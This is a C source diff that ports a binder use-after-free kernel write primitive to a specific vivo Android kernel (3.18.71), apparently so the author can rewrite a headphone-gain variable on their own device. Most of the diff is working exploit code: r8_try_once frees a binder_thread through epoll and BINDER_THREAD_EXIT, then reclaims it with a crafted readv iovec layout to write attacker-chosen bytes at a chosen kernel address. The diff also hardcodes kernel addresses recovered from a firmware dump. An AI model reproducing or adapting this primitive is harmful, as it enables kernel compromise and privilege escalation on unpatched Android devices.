@@ -334,22 +334,175 @@ static int run_rounds(unsigned long addr, const void *buf, size_t blen, int roun
 static const unsigned char HPGAIN7_DT[HPGAIN7_LEN]   = { 4, 3, 1, 1 }; /* 7's DT value = the stock arm */
 static const unsigned char HPGAIN7_601[HPGAIN7_LEN]  = { 4, 1, 1, 1 }; /* compiled default = 6.0.1's arm */
 
-static int hpgain_release_ok(const char *want)
+/* Route 8 (this device, 8.19.16): same two neighbours, recovered from the kernel Image
+ * shipped in the 9008 backup -- art/kallsyms-8-real.txt documents the recovery and its
+ * three anchors (modprobe literal, name-set equality against the device dump, first-name
+ * _text).  vivo embeds the type letter in the names blob; wcd_hph_gain is 'd' there. */
+#define HPGAIN8_VA        0xffffffc001963ec0UL          /* wcd_hph_gain (art/kallsyms-8-real.txt) */
+#define HPGAIN8_NEXT_VA   0xffffffc001963ec8UL          /* soc_codec_dev_tasha -- the object bound */
+#define HPGAIN8_LEN       4                             /* a 5th byte would walk into that neighbour */
+#define HPGAIN8_RELEASE   "3.18.71-perf-g8a8c60dd"      /* the build the address was recovered for */
+static const unsigned char HPGAIN8_DT[HPGAIN8_LEN]   = { 4, 3, 1, 1 }; /* same board, same stock arm */
+static const unsigned char HPGAIN8_601[HPGAIN8_LEN]  = { 4, 1, 1, 1 }; /* same compiled default */
+
+static int hpgain_osrelease(char *out, size_t cap)
 {
-    char got[128];
     size_t n;
     FILE *f = fopen("/proc/sys/kernel/osrelease", "r");
 
     if (!f)
         return 0;
-    if (!fgets(got, sizeof got, f)) {
+    if (!fgets(out, (int)cap, f)) {
         fclose(f);
         return 0;
     }
     fclose(f);
-    n = strcspn(got, "\n");
-    got[n] = 0;
-    return strcmp(got, want) == 0;
+    n = strcspn(out, "\n");
+    out[n] = 0;
+    return 1;
+}
+
+/* Route 8's own write primitive.  The su98-shaped clobber_data() above carries TWO 6.0.1/7
+ * assumptions that do not hold on 3.18.71: the freed binder_thread layout (ours is 0x128
+ * with wait.task_list at +0x50 -> WQI=4; the V20-shaped 3.18.71 build hands the wait entries
+ * to iov[9..11] of a 25-entry array) and arm_pending_tx(), whose drain-step itself fails on
+ * this kernel ("reply already eaten", measured).  tools/esc8.c measures the 8.1 shape and
+ * proves it on-device (first-shot 5/5), so this is a port of its w8_try_once/w8_write:
+ * no pending transaction -- epoll_ctl(ADD) + the child's epoll_ctl(DEL) alone free the
+ * thread -- and a 32-byte payload that rewrites iov[10].len and iov[11], so the final
+ * datalen bytes land at `target`.  Kept in step with esc8.c on purpose: a divergence here
+ * would make the CLI's result say nothing about the app's escalation. */
+#define R8_IOV_N    25
+#define R8_FILL     0x10001UL
+#define R8_PAYLOAD  32
+
+static unsigned char r8_dummy[4096] __attribute__((aligned(64)));
+static unsigned char *r8_big, *r8_fill;
+
+static int r8_init(void)
+{
+    if (r8_big != NULL)
+        return 0;
+    r8_big = mmap(NULL, 0x30000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (r8_big == MAP_FAILED) {
+        r8_big = NULL;
+        return -1;
+    }
+    memset(r8_big, 0, 0x30000);
+    r8_fill = malloc(R8_FILL);
+    if (r8_fill == NULL)
+        return -1;
+    memset(r8_fill, 'A', R8_FILL);
+    return 0;
+}
+
+static ssize_t r8_try_once(unsigned long target, const unsigned char *data, size_t datalen)
+{
+    int epfd, bfd, pfd[2];
+    struct iovec iov[R8_IOV_N];
+    struct epoll_event ev;
+    unsigned char payload[R8_PAYLOAD];
+    unsigned char wbuf[4096];
+    pid_t pid;
+    ssize_t r;
+    int i, st;
+
+    bfd = open("/dev/binder", O_RDONLY);
+    if (bfd < 0)
+        return -1;
+    epfd = epoll_create1(0);
+    if (epfd < 0) {
+        close(bfd);
+        return -1;
+    }
+    memset(&ev, 0, sizeof ev);
+    ev.events = EPOLLIN;
+    if (epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev) != 0) {
+        close(epfd);
+        close(bfd);
+        return -1;
+    }
+    if (pipe(pfd) != 0) {
+        close(epfd);
+        close(bfd);
+        return -1;
+    }
+    (void) fcntl(pfd[1], F_SETPIPE_SZ, 1 << 17);
+
+    memset(iov, 0, sizeof iov);
+    for (i = 0; i < R8_IOV_N; i++)
+        iov[i].iov_base = r8_dummy;
+    iov[9].iov_base = r8_big;
+    iov[9].iov_len = 0;                              /* becomes R8_FILL after list_del */
+    iov[10].iov_base = r8_big;
+    iov[10].iov_len = R8_FILL + R8_PAYLOAD + datalen; /* import-time total */
+
+    memset(payload, 0, sizeof payload);
+    *(uint64_t *) (payload + 0) = 0;
+    *(uint64_t *) (payload + 8) = R8_PAYLOAD;        /* iov[10].len == offset -> advance */
+    *(uint64_t *) (payload + 16) = target;           /* iov[11].base */
+    *(uint64_t *) (payload + 24) = datalen;          /* iov[11].len */
+
+    memset(wbuf, 0, sizeof wbuf);
+    memcpy(wbuf, data, datalen);
+
+    pid = fork();
+    if (pid < 0) {
+        close(pfd[0]);
+        close(pfd[1]);
+        close(epfd);
+        close(bfd);
+        return -1;
+    }
+    if (pid == 0) {
+        usleep(300000);                              /* parent imports + blocks */
+        if (epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev) != 0)
+            _exit(1);
+        if (write(pfd[1], r8_fill, R8_FILL) != (ssize_t) R8_FILL)
+            _exit(2);
+        if (write(pfd[1], payload, R8_PAYLOAD) != R8_PAYLOAD)
+            _exit(3);
+        if (write(pfd[1], wbuf, sizeof wbuf) != (ssize_t) sizeof wbuf)
+            _exit(4);
+        usleep(200000);
+        _exit(0);
+    }
+
+    ioctl(bfd, BINDER_THREAD_EXIT, NULL);            /* free binder_thread */
+    errno = 0;
+    alarm(10);
+    r = readv(pfd[0], iov, R8_IOV_N);                /* reclaim + walk iovecs */
+    alarm(0);
+
+    waitpid(pid, &st, 0);
+    close(pfd[0]);
+    close(pfd[1]);
+    close(epfd);
+    close(bfd);
+    return r;
+}
+
+/* esc8.c's caps and pacing: first-shot measured 5/5, each miss is a list_del on a stale
+ * chunk, so the attempt count stays small.  Returns 0 on the readv==expected criterion. */
+static int r8_write(unsigned long target, const unsigned char *data, size_t len, int tries)
+{
+    int i;
+
+    if (tries < 1)
+        tries = 1;
+    if (tries > 4)
+        tries = 4;
+    for (i = 0; i < tries; i++) {
+        ssize_t r = r8_try_once(target, data, len);
+
+        printf("  r8 try%d readv=%zd want=%lu%s\n", i + 1, r,
+               (unsigned long) (R8_FILL + R8_PAYLOAD + len),
+               r == (ssize_t) (R8_FILL + R8_PAYLOAD + len) ? "  *** CLOBBER OK ***" : "");
+        if (r == (ssize_t) (R8_FILL + R8_PAYLOAD + len))
+            return 0;
+        usleep(120000);
+    }
+    return -1;
 }
 #endif /* !ESC_LIB */
 
@@ -361,6 +514,7 @@ int main(int argc, char **argv)
     if (argc > 2 && argv[2][0] >= '0' && argv[2][0] <= '9') { WQI = atoi(argv[2]); }
     int mode_selftest = 1;
     int arm_hpgain = 0;
+    int hproute = 7;                                 /* 7 = su98 shape, 8 = esc8 shape (3.18.71) */
     unsigned long addr = 0;
     unsigned char buf[64];
     size_t blen = 0;
@@ -369,19 +523,35 @@ int main(int argc, char **argv)
     setvbuf(stdout, NULL, _IONBF, 0);
 #ifndef ESC_LIB
     if (argc > 3 && !strcmp(argv[2], "hpgain")) {
+        char rel[128];
+        unsigned long next;
+        const unsigned char *dt_vals, *g601_vals;
+        int hlen;
         mode_selftest = 0;
         arm_hpgain = 1;
-        addr = HPGAIN7_VA;
-        if (!hpgain_release_ok(HPGAIN7_RELEASE)) {
-            printf("REFUSE: the hpgain arm was compiled for osrelease \"%s\" and the running kernel is "
-                   "not that build -- writing an address recovered for another kernel is a guess, not a "
-                   "port\n", HPGAIN7_RELEASE);
+        if (!hpgain_osrelease(rel, sizeof rel)) {
+            printf("REFUSE: cannot read /proc/sys/kernel/osrelease -- the hpgain arm will not "
+                   "guess which kernel set to trust\n");
+            return 1;
+        }
+        if (!strcmp(rel, HPGAIN7_RELEASE)) {
+            addr = HPGAIN7_VA; next = HPGAIN7_NEXT_VA; hlen = HPGAIN7_LEN;
+            dt_vals = HPGAIN7_DT; g601_vals = HPGAIN7_601;
+            hproute = 7;
+        } else if (!strcmp(rel, HPGAIN8_RELEASE)) {
+            addr = HPGAIN8_VA; next = HPGAIN8_NEXT_VA; hlen = HPGAIN8_LEN;
+            dt_vals = HPGAIN8_DT; g601_vals = HPGAIN8_601;
+            hproute = 8;
+        } else {
+            printf("REFUSE: the hpgain arm carries sets for osrelease \"%s\" and \"%s\" and the "
+                   "running kernel is \"%s\" -- writing an address recovered for another kernel "
+                   "is a guess, not a port\n", HPGAIN7_RELEASE, HPGAIN8_RELEASE, rel);
             return 1;
         }
         if (!strcmp(argv[3], "601"))
-            memcpy(buf, HPGAIN7_601, HPGAIN7_LEN), blen = HPGAIN7_LEN;
+            memcpy(buf, g601_vals, (size_t)hlen), blen = (size_t)hlen;
         else if (!strcmp(argv[3], "stock"))
-            memcpy(buf, HPGAIN7_DT, HPGAIN7_LEN), blen = HPGAIN7_LEN;
+            memcpy(buf, dt_vals, (size_t)hlen), blen = (size_t)hlen;
         else {
             printf("hpgain arm must be 601 or stock (got \"%s\") -- nothing to write\n", argv[3]);
             return 1;
@@ -396,8 +566,8 @@ int main(int argc, char **argv)
         else
             WQI = 4;
         SAFEFED = (argc > 5 && argv[5][0] >= '0' && argv[5][0] <= '9') ? atoi(argv[5]) : 0;
-        printf("hpgain arm=%s va=%#lx len=%zu bound=%#lx (span %lu) WQI=%d SAFEFED=%d\n", argv[3], addr,
-               blen, HPGAIN7_NEXT_VA, HPGAIN7_NEXT_VA - HPGAIN7_VA, WQI, SAFEFED);
+        printf("hpgain arm=%s va=%#lx len=%zu bound=%#lx (span %lu) WQI=%d SAFEFED=%d rel=%s\n", argv[3], addr,
+               blen, next, next - addr, WQI, SAFEFED, rel);
     }
 #endif
     if (argc > 4 && !strcmp(argv[2], "kern")) {
@@ -445,8 +615,9 @@ int main(int argc, char **argv)
         printf("bad WQI=%d: must be in [1, %d]\n", WQI, IOVEC_ARRAY_SZ - 5);
         return 1;
     }
-    printf("mode=%s addr=%#lx len=%zu  (WQI=%d array_sz=%d SAFEFED=%d)\n",
-           mode_selftest ? "SELFTEST(user target)" : "KERN", addr, blen, WQI, IOVEC_ARRAY_SZ, SAFEFED);
+    if (!(arm_hpgain && hproute == 8))
+        printf("mode=%s addr=%#lx len=%zu  (WQI=%d array_sz=%d SAFEFED=%d)\n",
+               mode_selftest ? "SELFTEST(user target)" : "KERN", addr, blen, WQI, IOVEC_ARRAY_SZ, SAFEFED);
     if (mode_selftest) {
         addr = (unsigned long)&testDatum;
         *(unsigned long *)buf = 0;
@@ -454,9 +625,30 @@ int main(int argc, char **argv)
     }
     if (blen == 0) { printf("nothing to write\n"); return 1; }
 
-    ok = run_rounds(addr, buf, blen, rounds, 1);
-    printf("RESULT: %s\n", ok == 1 ? "PRIMITIVE WORKS" : "no hit in this batch");
-    return ok == 1 ? 0 : 1;
+    /* Under ESC_LIB the hpgain arm never arms (arm_hpgain stays 0) and route 8 lives in
+     * esc8.c's own escalation, so the r8_* port is #ifndef-only -- keep the dispatch out
+     * of that build rather than re-rolling broot7/libesc with dead CLI code. */
+#ifndef ESC_LIB
+    if (arm_hpgain && hproute == 8) {
+        /* 3.18.71: the WQI/SAFEFED knobs above describe the 6.0.1/7 shape and are
+         * meaningless here -- route 8 has its own layout (iov[9..11]) and its own pacing. */
+        int tries = rounds < 1 ? 1 : (rounds > 4 ? 4 : rounds);
+
+        printf("mode=KERN addr=%#lx len=%zu (route8: esc8 layout, no arm_pending_tx, tries=%d)\n",
+               addr, blen, tries);
+        if (r8_init() != 0) {
+            printf("r8: buffer setup failed errno=%d\n", errno);
+            return 1;
+        }
+        pin0();
+        ok = r8_write(addr, buf, blen, tries) == 0;
+    } else
+#endif
+    {
+        ok = run_rounds(addr, buf, blen, rounds, 1) == 1;
+    }
+    printf("RESULT: %s\n", ok ? "PRIMITIVE WORKS" : "no hit in this batch");
+    return ok ? 0 : 1;
 }
 
 #ifdef ESC_LIB
